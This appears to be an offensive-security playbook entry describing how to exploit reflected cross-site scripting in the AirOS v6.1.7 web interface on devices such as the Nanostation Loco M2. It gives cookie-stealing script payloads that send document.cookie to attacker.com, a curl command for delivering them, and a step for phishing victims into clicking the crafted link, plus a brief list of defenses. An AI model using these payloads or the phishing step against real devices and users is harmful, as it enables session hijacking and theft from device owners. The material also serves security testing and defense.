---
tags:
  - xss
  - injection
  - payload
  - airos
type: procedure
tools:
  - '[[tools/Burp-Suite]]'
tactics:
  - '[[Execution]]'
commands:
  - '[[commands/curl-payload-delivery]]'
verified: false
platforms:
  - Web
  - Embedded Device
submitted: true
created_at: '2024-10-01T00:00:00Z'
techniques:
  - '[[JavaScript]]'
updated_at: '2025-12-14T03:46:26.657Z'
skill_level: intermediate
impact_level: high
detection_risk: medium
sub_techniques: []
id: 8cd5d735-1f48-43b9-bec3-4f3269998007
validated: true
mitre_tactics:
  - '[[Execution]]'
mitre_techniques:
  - '[[JavaScript]]'
---
# Inject-Reflected-XSS-Payload

## Summary

This procedure crafts and injects a JavaScript payload into vulnerable parameters of the AirOS web interface to execute arbitrary code in the victim's browser, enabling session theft.

## Description

Targeting reflected XSS in AirOS v6.1.7 on devices like Nanostation Loco M2, the attacker constructs a URL with a payload (e.g., <script>fetch('http://attacker.com?'+document.cookie)</script>) in a parameter like 'msg'. The victim clicks the link, causing the device to reflect and execute the script. Prerequisites: Vulnerable endpoint identified, attacker-controlled server for exfiltration. Outcomes: Execution of JS for data theft.

## Requirements

1. Identified vulnerable parameter from prior recon
2. Attacker server to receive stolen data (e.g., via ngrok)
3. Victim access to the device interface

## Defense

Defensive measures and detection strategies:

- Sanitize all user inputs with HTML escaping
- Use Content Security Policy (CSP) to restrict script execution
- Log and alert on requests containing script tags or unusual redirects

## Objectives

1. Deliver executable JavaScript via reflected parameter
2. Exfiltrate session information to attacker
3. Maintain stealth to avoid detection

## Instructions

### Step 1: Craft Payload

**Context**: Build a payload to capture and send cookies to an external server.

**Command** ([[commands/curl-payload-delivery]]):
```bash
curl -G "http://<device-ip>/login.html" --data-urlencode "msg=<script>var i=new Image();i.src='http://attacker.com/steal?'+document.cookie;</script>"
```

> Test locally; payload uses Image src for exfiltration without alerts.

### Step 2: Deliver to Victim

**Context**: Send the full malicious URL to the target user via phishing or social engineering.

**Command** ([[commands/curl-payload-delivery]]):
```bash
# No direct command; use browser or email tool to share: http://<device-ip>/login.html?msg=<script>...</script>
```

> Victim clicks, script executes in their session context.

## MITRE ATT&CK Mapping

### Tactics

- [[Execution]]

### Techniques

- [[JavaScript]]

### Sub-Techniques


## Commands Used

- [[commands/curl-payload-delivery]]

## Tools Used

- [[tools/Burp-Suite]]

## Tags

- xss
- injection
